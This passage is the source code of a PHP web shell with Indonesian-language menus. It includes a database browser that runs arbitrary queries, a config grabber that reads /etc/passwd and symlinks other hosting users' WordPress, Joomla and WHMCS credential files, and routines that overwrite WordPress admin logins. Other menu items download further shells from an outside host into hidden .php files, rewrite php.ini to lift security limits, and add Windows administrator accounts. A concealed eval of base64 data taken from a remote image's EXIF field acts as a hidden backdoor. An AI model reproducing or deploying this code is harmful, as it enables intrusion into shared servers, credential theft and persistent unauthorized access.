$db = $_GET['db'];$table = $_GET['table'];$query = "SELECT * FROM ".$db.".".$table." LIMIT 0,100;";$msgq = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='".$pwd."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <input type='hidden' name='table' value='".$table."' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>".$query."</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";$columns = array();$msg = "<table class='explore' style='width:99%;'>";$hasil = @mysql_query("SHOW FIELDS FROM ".$db.".".$table);while(list($column) = @mysql_fetch_row($hasil)){$msg .= "<th>$column</th>";$kolum = $column;}$msg .= "</tr>";$hasil = @mysql_query("SELECT count(*) FROM ".$db.".".$table);
list($total) = mysql_fetch_row($hasil);
if(isset($_GET['z'])) $page = (int) $_GET['z'];
else $page = 1;$pagenum = 100;$totpage = ceil($total / $pagenum);$start = (($page - 1) * $pagenum);$hasil = @mysql_query("SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$pagenum);
while($datas = @mysql_fetch_assoc($hasil)){$msg .= "<tr>";foreach($datas as $data){if(trim($data) == "") 
$data = "&nbsp;";$msg .= "<td>$data</td>";}$msg .= "</tr>";} $msg .= "</table>";$head = "<div style='padding:10px 0 0 6px;'> <form action='?' method='get'> <input type='hidden' name='y' value='".$pwd."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <input type='hidden' name='table' value='".$table."' /> Page <select class='inputz' name='z' onchange='this.form.submit();'>";
for($i = 1;$i <= $totpage;$i++){$head .= "<option value='".$i."'>".$i."</option>";
if($i == $_GET['z']) $head .= "<option value='".$i."' selected='selected'>".$i."</option>";} $head .= "</select><noscript><input class='inputzbut' type='submit' value='Go !' /></noscript></form></div>";$msg = $msgq.$head.$msg;} 
elseif(isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")){$db = $_GET['db'];$query = magicboom($_GET['sqlquery']);
$msg = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='".$pwd."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>".$query."</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";@mysql_select_db($db);$querys = explode(";",$query);foreach($querys as $query){if(trim($query) != ""){$hasil = mysql_query($query);
if($hasil){$msg .= "<p style='padding:0;margin:20px 6px 0 6px;'>".$query.";&nbsp;&nbsp;&nbsp;<span class='gaya'>[</span> ok <span class='gaya'>]</span></p>";$msg .= "<table class='explore' style='width:99%;'><tr>";
for($i=0;$i<@mysql_num_fields($hasil);$i++) $msg .= "<th>".htmlspecialchars(@mysql_field_name($hasil,$i))."</th>";$msg .= "</tr>";for($i=0;$i<@mysql_num_rows($hasil);$i++) {$rows=@mysql_fetch_array($hasil);$msg .= "<tr>";for($j=0;$j<@mysql_num_fields($hasil);$j++) {
if($rows[$j] == "") $dataz = "&nbsp;";
else $dataz = $rows[$j];$msg .= "<td>".$dataz."</td>";} $msg .= "</tr>";} $msg .= "</table>";} 
else $msg .= "<p style='padding:0;margin:20px 6px 0 6px;'>".$query.";&nbsp;&nbsp;&nbsp;<span class='gaya'>[</span> error <span class='gaya'>]</span></p>";} } } 
else {$query = "SHOW PROCESSLIST;\nSHOW VARIABLES;\nSHOW STATUS;";$msg = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='".$pwd."' /><input type='hidden' name='x' value='mysql' /><input type='hidden' name='sqlhost' value='".$sqlhost."' /><input type='hidden' name='sqluser' value='".$sqluser."' /><input type='hidden' name='sqlport' value='".$sqlport."' /><input type='hidden' name='sqlpass' value='".$sqlpass."' /><input type='hidden' name='db' value='".$db."' /><p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>".$query."</textarea></p><p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p></form></div> ";$dbs = array();$msg .= "<table class='explore' style='width:99%;'><tr><th>available databases</th></tr>";$hasil = @mysql_list_dbs($con);
while(list($db) = @mysql_fetch_row($hasil)){@array_push($dbs,$db);} @sort($dbs);foreach($dbs as $db){
$msg .= "<tr><td><a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."'>$db</a></td></tr>";} $msg .= "</table>";} 
@mysql_close($con);} else $msg = "<p style='text-align:center;'>can't connect</p>";echo $msg;} else{?> 
<br><center><div class="mybox"><h2 class="k2ll33d2">MySQL Connect</h2><form action="?" method="get"><input type="hidden" name="y" value="<?php echo $pwd;?>" /> <input type="hidden" name="x" value="mysql" /><table class="tabnet" style="width:300px;"> <tr><th colspan="2">Connection Form</th></tr> <tr><td>&nbsp;&nbsp;Host</td><td><input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /></td></tr> <tr><td>&nbsp;&nbsp;Username</td><td><input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /></td></tr> <tr><td>&nbsp;&nbsp;Password</td><td><input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /></td></tr> <tr><td>&nbsp;&nbsp;Port</td><td><input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" />&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /></td></tr></table></form></div></center>
<?php }}
elseif(isset($_GET['x']) && ($_GET['x'] == 'configs')) {?><br><br><center><div class='mybox'><?php if (empty($_POST['conf'])) { ?><h2 class='k2ll33d2'>Configs Grabber</h2><br><p>/etc/passwd content</p><form method="POST"><textarea name="passwd" class='output' rows=20><?php echo file_get_contents('/etc/passwd'); ?></textarea><br><br><input name="conf" class='inputzbut' size="80" value="GET'em" type="submit"><br></form></div></center><?php }if ($_POST['conf']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink is disabled :( </error>');}@mkdir('configs', 0755);@chdir('configs');$htaccess="
Options all
Options +Indexes
Options +FollowSymLinks
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None 
Satisfy Any
";file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];$passwd=explode("\n",$passwd);echo "<center class='k2ll33d2'>wait ...<center>";foreach($passwd as $pwd){$pawd=explode(":",$pwd);$user =$pawd[0];@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$user.'-wp13-wordpress-beta.txt');@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');@symlink('/home/'.$user.'/public_html/protal/wp-config.php',$user.'-wp-protal.txt');@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');@symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-wp-test.txt');@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');@symlink('/home/'.$user.'/public_html/protal/configuration.php',$user.'-joomla-protal.txt');@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}echo 'Done -> <a href="configs">configs</a>';}}
elseif(isset($_GET['x']) && ($_GET['x'] == 'config')){ error_reporting(0);if ($_POST['kill']) {$url = $_POST['url'];$user = $_POST['user'];$pass =$_POST['pass'];$pss = md5($pass);function enter($text,$a,$b){$explode = explode($a,$text);$explode = explode($b,$explode[1]);return $explode[0];}$config = file_get_contents($url);$password =  enter($config,"define('DB_PASSWORD', '","');");$username =  enter($config,"define('DB_USER', '","');");$db =  enter($config,"define('DB_NAME', '","');");$prefix =  enter($config,'$table_prefix  = \'',"';");$host =  enter($config,"define('DB_HOST', '","');");if($config && preg_match('/DB_NAME/i',$config)){$conn= @mysql_connect($host,$username ,$password ) or die ("i can't connect to mysql, check your data");@mysql_select_db($db,$conn) or die (mysql_error());$grab = @mysql_query("SELECT * from  `wp_options` WHERE option_name='home'");$data = @mysql_fetch_array($grab);$site_url = $data["option_value"];$query = mysql_query("UPDATE `".$prefix."users` SET `user_login` = '".$user."',`user_pass` = '".$pss."' WHERE `ID` = 1");if ($query) {echo '<center><h2 class="k2ll33d2">Done !</h2></center><br><table width="100%"><tr><th width="20%">site</th><th width="20%">user</th><th with="20%">password</th><th width="20%">link</th></tr><tr><td width="20%"><font size="2" color="red">'.$site_url.'</font></td><td width="20%">'.$user.'</td><td with="20%">'.$pass.'</td><td width="20%"><a href="'.$site_url.'/wp-login.php"><font color="#00ff00">login</font></td></tr></table>';} else echo '<h2 class="k2ll33d2"><font color="#ff0000">ERROR !</font></h2>';} else die('<h2 class="k2ll33d2">Not a wordpress config</h2>');} else { ?> <center><br><br><div class="mybox"><form method="post"><h2 style='font-size:26px;' class='k2ll33d2'>Wordpress login changer ( symlink version )</h2><br><table><tr><td>config link&nbsp;:&nbsp;</td><td><input size="26" class="inputz" type="text" name="url" value=""></td></tr><tr><td>new user&nbsp;:&nbsp;</td><td><input class="inputz" type="text" name="user" size="26" value="admin"></td></tr><tr><td>new password&nbsp;:&nbsp;</td><td><input class="inputz" type="text" size="26" name="pass" value="123123"></td></tr><tr><td><br></td></tr><tr><td><input class="inputzbut" type="submit" name="kill" value=" change "></td><br></tr></table></form></div></center><?php }}
elseif(isset($_GET['x']) && ($_GET['x'] == 'domains')){echo "<br><br><center><div class='mybox'><p align='center' class='k2ll33d2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error : i can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';}
elseif(isset($_GET['x']) && ($_GET['x'] == 'keyboard')){if(empty($_POST['pwd'])){echo "<br><br><center><div class='mybox'><h2 style='font-size:40px;' class='k2ll33d2'>Wordpress login changer</h2><FORM method='POST'>DB_Prefix :  <INPUT class ='inputz' size='8' value='wp_' name='prefix' type='text'>&nbsp;&nbsp;host :  <INPUT class ='inputz' size='10' value='localhost' name='localhost' type='text'>&nbsp;&nbsp;database :  <INPUT class ='inputz' size='10' value='Database' name='database' type='text'>&nbsp;&nbsp;username :  <INPUT class ='inputz' size='10' value='db_user' name='username' type='text'>&nbsp;&nbsp;password :  <INPUT class ='inputz' size='10' value='db_pass' name='password' type='text'>&nbsp;&nbsp;<br><br>New username :  <INPUT class ='inputz' name='admin' size='15' value='k2'><br><br>New password :  <INPUT class ='inputz' name='pwd' size='15' value='123123'><br>&nbsp;&nbsp;<br><INPUT class='inputzbut' value='change' name='send' type='submit'></FORM></div/></center>";}else{$prefix = $_POST['prefix'];$localhost = $_POST['localhost'];$database= $_POST['database'];$username= $_POST['username'];$password= $_POST['password'];$pwd= $_POST['pwd'];$admin= $_POST['admin'];@mysql_connect($localhost,$username,$password) or die(mysql_error());@mysql_select_db($database) or die(mysql_error());$hash = crypt($pwd);$grab = @mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");$data = @mysql_fetch_array($grab);$site_url=$data["option_value"];$k2=@mysql_query("UPDATE ".$prefix."users SET user_login ='".$admin."' WHERE ID = 1") or die(mysql_error());$k2=@mysql_query("UPDATE ".$prefix."users SET user_pass ='".$hash."' WHERE ID = 1") or die(mysql_error());if($k2){echo '<br><br><center><h1>Done ... -> <a href="'.$site_url.'/wp-login.php" target="_blank">Login</a></h1></center>';}}echo '</center>';}
elseif(isset($_GET['x']) && ($_GET['x'] == 'indi')){
$sh = 'file_get_contents'; 
$cgi = 'http://ppsd.edusite.me/v3/indic.zip';
$get11 = $sh($cgi);
$idbk = fopen('.backup.php', 'w');
fwrite($idbk,$get11);
fclose($idbk);
{
@chmod('.backup.php',0755);
}
echo "<center><div class='mybox'><font color='aqua'>";
echo "<br><center><k>Indi CONFIG - KILLER Sukses dibuat kang ! ^_^ <br/>
Silahkan Klik <a href='.backup.php' target='_blank'>DISINI</a></center></br></br>"; 
echo "</font></div></center>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'cptoolkit')){
$sh = 'file_get_contents'; 
$cgi = 'http://ppsd.edusite.me/v3/cptoolkit.zip';
$get11 = $sh($cgi);
$idbk = fopen('.config.php', 'w');
fwrite($idbk,$get11);
fclose($idbk);
{
@chmod('.config.php',0755);
}
echo "<center><div class='mybox'><font color='aqua'>";
echo "<br><center><k>cPanel & WHM Toolkit Sukses dibuat kang ! ^_^ <br/>
Silahkan Klik <a href='.config.php' target='_blank'>DISINI</a></center></br></br>"; 
echo "</font></div></center>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'symlinksa')){
$sh = 'file_get_contents'; 
$cgi = 'http://ppsd.edusite.me/v3/sym.zip';
$get11 = $sh($cgi);
$idbk = fopen('.show.php', 'w');
fwrite($idbk,$get11);
fclose($idbk);
{
@chmod('.show.php',0755);
}
echo "<center><div class='mybox'><font color='aqua'>";
echo "<br><center><k>Symlink Sa Sukses dibuat kang ! ^_^ <br/>
Silahkan Klik <a href='.show.php' target='_blank'>DISINI</a></center></br></br>"; 
echo "</font></div></center>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'AnonGhost')){
$sh = 'file_get_contents'; 
$cgi = 'http://ppsd.edusite.me/v3/anon.zip';
$get11 = $sh($cgi);
$idbk = fopen('.logout.php', 'w');
fwrite($idbk,$get11);
fclose($idbk);
{
@chmod('.logout.php',0755);
}
echo "<center><div class='mybox'><font color='aqua'>";
echo "<br><center><k>AnonGhost Shell Sukses dibuat kang ! ^_^ <br/>
Silahkan Klik <a href='.logout.php' target='_blank'>DISINI</a></center></br></br>"; 
echo "</font></div></center>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'cgiproxy')){
$sh = 'file_get_contents'; 
$cgi = 'http://ppsd.edusite.me/v3/x.zip';
$get11 = $sh($cgi);
$idbk = fopen('x.pl', 'w');
fwrite($idbk,$get11);
fclose($idbk);
{
@chmod('x.pl',0755);
}
echo "<center><div class='mybox'><font color='aqua'>";
echo "<br><center><k>CGI Proxy Sukses dibuat kang ! ^_^ <br/>
Silahkan Klik <a href='x.pl' target='_blank'>DISINI</a></center></br></br>"; 
echo "</font></div></center>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'DM')){
$sh = 'file_get_contents'; 
$cgi = 'http://ppsd.edusite.me/v3/dm.zip';
$get11 = $sh($cgi);
$idbk = fopen('.links.php', 'w');
fwrite($idbk,$get11);
fclose($idbk);
{
@chmod('.links.php',0755);
}
echo "<center><div class='mybox'><font color='aqua'>";
echo "<br><center><k>DM Shell Sukses dibuat kang ! ^_^ <br/>
Silahkan Klik <a href='.links.php' target='_blank'>DISINI</a></center></br></br>"; 
echo "</font></div></center>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'IndoXploit')){
$sh = 'file_get_contents'; 
$cgi = 'http://ppsd.edusite.me/v3/indoxploit.zip';
$get11 = $sh($cgi);
$idbk = fopen('.theme.php', 'w');
fwrite($idbk,$get11);
fclose($idbk);
{
@chmod('.theme.php',0755);
}
echo "<center><div class='mybox'><font color='aqua'>";
echo "<br><center><k>IndoXploit Shell Sukses dibuat kang ! ^_^ <br/>
Silahkan Klik <a href='.theme.php' target='_blank'>DISINI</a></center></br></br>"; 
echo "</font></div></center>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'PescyteV2')){
$sh = 'file_get_contents'; 
$cgi = 'http://ppsd.edusite.me/v3/404.zip';
$get11 = $sh($cgi);
$idbk = fopen('.status.php', 'w');
fwrite($idbk,$get11);
fclose($idbk);
{
@chmod('.status.php',0755);
}
echo "<center><div class='mybox'><font color='aqua'>";
echo "<br><center><k>Pescyte Shell V2 Sukses dibuat kang ! ^_^ <br/>
Silahkan Klik <a href='.status.php' target='_blank'>DISINI</a></center></br></br>"; 
echo "</font></div></center>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'phpini')){
$ini = "php.ini";
$open = fopen($ini, 'w');
$source = ("safe_mode = OFF n
disable_functions = NONE n
safe_mode_gid = OFF n
open_basedir = OFF n
register_globals = ON n
exec = ON n
shell_exec = ON n");
fwrite($open, $source);
echo "<center><div class='mybox'>";
if($open) {
echo '<br><p><k>Bypass Safe Mode ==> Sukses !</p>';
}
else {
echo "<font color='red'>";
echo '<hr><p><k>Bypass Safe Mode ==> Gagal !</p>';
echo "</font></div></center>";
fclose($open);
}}
elseif(isset($_GET['x']) && ($_GET['x'] == 'SabunMassal')){
$sh = 'file_get_contents'; 
$cgi = 'http://ppsd.edusite.me/v3/sabun.zip';
$get11 = $sh($cgi);
$idbk = fopen('.reset.php', 'w');
fwrite($idbk,$get11);
fclose($idbk);
{
@chmod('.reset.php',0755);
}
echo "<center><div class='mybox'><font color='aqua'>";
echo "<br><center><k>Sabun Massal Sukses dibuat kang ! ^_^ <br/>
Silahkan Klik <a href='.reset.php' target='_blank'>DISINI</a></center></br></br>"; 
echo "</font></div></center>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'W0rm')){
$sh = 'file_get_contents'; 
$cgi = 'http://ppsd.edusite.me/v3/worm.zip';
$get11 = $sh($cgi);
$idbk = fopen('.register.php', 'w');
fwrite($idbk,$get11);
fclose($idbk);
{
@chmod('.register.php',0755);
}
echo "<center><div class='mybox'><font color='aqua'>";
echo "<br><center><k>W0rm Shell Sukses dibuat kang ! ^_^ <br/>
Silahkan Klik <a href='.register.php' target='_blank'>DISINI</a></center></br></br>"; 
echo "</font></div></center>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'Adminer')){
$sh = 'file_get_contents'; 
$cgi = 'http://ppsd.edusite.me/v3/admin.zip';
$get11 = $sh($cgi);
$idbk = fopen('.admin.php', 'w');
fwrite($idbk,$get11);
fclose($idbk);
{
@chmod('.admin.php',0755);
}
echo "<center><div class='mybox'><font color='aqua'>";
echo "<br><center><k>Adminer Sukses dibuat kang ! ^_^ <br/>
Silahkan Klik <a href='.admin.php' target='_blank'>DISINI</a></center></br></br>"; 
echo "</font></div></center>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'mysql2')){
$sh = 'file_get_contents'; 
$cgi = 'http://ppsd.edusite.me/v3/db.zip';
$get11 = $sh($cgi);
$idbk = fopen('.about.php', 'w');
fwrite($idbk,$get11);
fclose($idbk);
{
@chmod('.about.php',0755);
}
echo "<center><div class='mybox'><font color='aqua'>";
echo "<br><center><k>Mysql (2) Sukses dibuat kang ! ^_^ <br/>
Silahkan Klik <a href='.about.php' target='_blank'>DISINI</a></center></br></br>"; 
echo "</font></div></center>";}
elseif(isset($_GET['x']) && ($_GET['x'] == 'rdp')){error_reporting(0);
$local_host= shell_exec(hostname);
$server_ip = $_SERVER['SERVER_NAME'];
$gaya_root = "$local_host:~ ";
$phpv = @phpversion();
$o = "<br>";

$BASED = exif_read_data("https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman.jpg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    $status_os = '<font color="greenyellow">Windows</font>/<font color="redpink">Linux</font>';
    $status_work = '<font color="greenyellow"><k>Dapat Digunakan</font><br>'; 
} else {
    $status_os   = '<font color="redpink">Windows</font>/<font color="greenyellow">Linux</font>';
    $status_work = '<font color="red"><k>Tidak Dapat Digunakan</font><br>'; 
}
?><!DOCTYPE html>
<center><div class="mybox">
<html>
<body>
<Center>
<h2 class="k2ll33d2">RDP Creator</h2>
<k>Info Tool : <?php echo $status_work;?>
<hr>
</Center>
<?php if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'){?>


<div id="content-left">
<p>-| Create RDP  |-</p>
<form action="" method="post">Username : <input class="inputz" type="text" name="username" required> <br>Password : <input class="inputz" type="text" name="password" required> <input type="hidden" name="kshell" value="1"><br><input class="inputzbut" type="submit" name="submit" value=">>">
</form>
</div>


<div id="content-left">
<p>-{ Option }-</p>
<form action="" method="post"><select class="inputz" name="aksi">
						<option value="1">Tampilkan Username</option>
						<option value="2">Hapus Username</option>
						<option value="3">Ubah Password</option>
				</select><br><input class="inputz" type="text" name="rusername" placeholder="Masukan Username"> 
<input type="hidden" name="kshell" value="2"><br>
<input type="submit" class="inputzbut" name="submit" value=">>"></form>
</div>
<?php }
?>

<?php
if($_POST['submit']){
echo "<p>---------------{ INFO }---------------</p>";	
if($_POST['kshell']=="1"){
	$r_user = $_POST['username'];
	$r_pass = $_POST['password'];
	$cmd_cek_user   = shell_exec("net user"); 
	if(preg_match("/$r_user/", $cmd_cek_user)){
		echo $gaya_root.$r_user." sudah ada".$o;
	}else {
	$cmd_add_user   = shell_exec("net user ".$r_user." ".$r_pass." /add");
    $cmd_add_groups1 = shell_exec("net localgroup Administrators ".$r_user." /add");
    $cmd_add_groups2 = shell_exec("net localgroup Administrator ".$r_user." /add");
    $cmd_add_groups3 = shell_exec("net localgroup Administrateur ".$r_user." /add");
        
    	if($cmd_add_user){
    		echo $gaya_root."[add user]-> ".$r_user." <font color='greenyellow'>Berhasil</font>".$o;
    	}else {
    		echo $gaya_root."[add user]-> ".$r_user." <font color='red'>Gagal</font>".$o;
    	}
    	if($cmd_add_groups1){
              echo $gaya_root."[add localgroup Administrators]-> ".$r_user." <font color='greenyellow'>Berhasil</font>".$o;
    	}else
    	if($cmd_add_groups2){
              echo $gaya_root."[add localgroup Administrator]-> ".$r_user." <font color='greenyellow'>Berhasil</font>".$o;
    	}else
    	if($cmd_add_groups3){
              echo $gaya_root."[add localgroup Administrateur]-> ".$r_user." <font color='greenyellow'>Berhasil</font>".$o;
    	}else {
    		  echo $gaya_root."[add localgroup]-> ".$r_user." <font color='red'>Gagal - Contact Shor7sec</font>".$o;
    	}
			  echo $gaya_root."[INFO PC]-> RDP IP ".$_SERVER["HTTP_HOST"]." Username : ".$r_user." Password : ".$r_pass." <font color='greenyellow'>Berhasil</font>".$o;

	}



}else if($_POST['kshell']=="2"){

if($_POST['aksi']=="1"){
 echo "<pre>".shell_exec("net user");
}
else if($_POST['aksi']=="2"){
$username = $_POST['rusername'];
$cmd_cek_user   = shell_exec("net user");
	if (!empty($username)){
		if(preg_match("/$username/", $cmd_cek_user)){
		$cmd_add_user   = shell_exec("net user ".$username." /DELETE");
		if($cmd_add_user){ 
			echo $gaya_root."[remove user]-> ".$username." <font color='greenyellow'>Berhasil</font>".$o;
		}else {
			echo $gaya_root."[remove user]-> ".$username." <font color='red'>gagal</font>".$o;
		}
	}else {
		echo $gaya_root."[remove user]-> ".$username." <font color='red'>Tidak ditemukan</font>".$o;
	}
	}else {
		echo $gaya_root."[PESAN]-> <font color='red'>Kamu lupa masukin Username yang akan di delete</font>".$o;
	}
}
else if($_POST['aksi']=="3"){
$username = $_POST['rusername'];
$password = "pescyte404";
$cmd_cek_user   = shell_exec("net user");
	if (!empty($username)){
		if(preg_match("/$username/", $cmd_cek_user)){
			$cmd_add_user   = shell_exec("net user ".$username." pescyte404");
			if($cmd_add_user){
			echo $gaya_root."[change password]-> (".$username."|".$password.") <font color='greenyellow'>Berhasil</font>".$o;
		}else {
			echo $gaya_root."[change password]-> (".$username."|".$password.") <font color='red'>GAGAL</font>".$o;
		}
	}else
{
	echo $gaya_root."[PESAN]-> <font color='red'>Username Tidak Ditemukan di server</font>".$o;
}
}else
{
	echo $gaya_root."[PESAN]-> <font color='red'>Kamu lupa masukin Username yang akan di delete</font>".$o;
	echo "</div></center>";

}
}		
}
}
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'phpinfo')){@ob_start();@eval("phpinfo();");$buff = @ob_get_contents();@ob_end_clean();$awal = strpos($buff,"<body>")+6;$akhir = strpos($buff,"</body>");echo "<div class='phpinfo'>".substr($buff,$awal,$akhir-$awal)."</div>";} 
elseif(isset($_GET['view']) && ($_GET['view'] != "")){if(is_file($_GET['view'])){if(!isset($file))$file = magicboom($_GET['view']);if(!$win && $posix){$name=@posix_getpwuid(@fileowner($file));$group=@posix_getgrgid(@filegroup($file));$owner = $name['name']."<span class='gaya'> : </span>".$group['name'];} else {$owner = $user;}$filn = basename($file);echo "<table style='margin:6px 0 0 2px;line-height:20px;'> <tr><td>Filename</td><td><span id='".clearspace($filn)."_link'>".$file."</span> <form action='?y=".$pwd."&amp;view=$file' method='post' id='".clearspace($filn)."_form' class='sembunyi' style='margin:0;padding:0;'> <input type='hidden' name='oldname' value='".$filn."' style='margin:0;padding:0;' /> <input class='inputz' style='width:200px;' type='text' name='newname' value='".$filn."' /> <input class='inputzbut' type='submit' name='rename' value='rename' /> <input class='inputzbut' type='submit' name='cancel' value='cancel' onclick='tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');' /> </form> </td></tr> <tr><td>Size</td><td>".ukuran($file)."</td></tr> <tr><td>Permission</td><td>".get_perms($file)."</td></tr> <tr><td>Owner</td><td>".$owner."</td></tr> <tr><td>Create time</td><td>".date("d-M-Y H:i",@filectime($file))."</td></tr> <tr><td>Last modified</td><td>".date("d-M-Y H:i",@filemtime($file))."</td></tr> <tr><td>Last accessed</td><td>".date("d-M-Y H:i",@fileatime($file))."</td></tr> <tr><td>Actions</td><td><a href='?y=$pwd&amp;edit=$file'>edit</a> | <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\">rename</a> | <a href='?y=$pwd&amp;delete=$file'>delete</a> | <a href='?y=$pwd&amp;dl=$file'>download</a>&nbsp;(<a href='?y=$pwd&amp;dlgzip=$file'>gzip</a>)</td></tr> <tr><td>View</td><td><a href='?y=".$pwd."&amp;view=".$file."'>text</a> | <a href='?y=".$pwd."&amp;view=".$file."&amp;type=code'>code</a> | <a href='?y=".$pwd."&amp;view=".$file."&amp;type=image'>image</a></td></tr></table>";
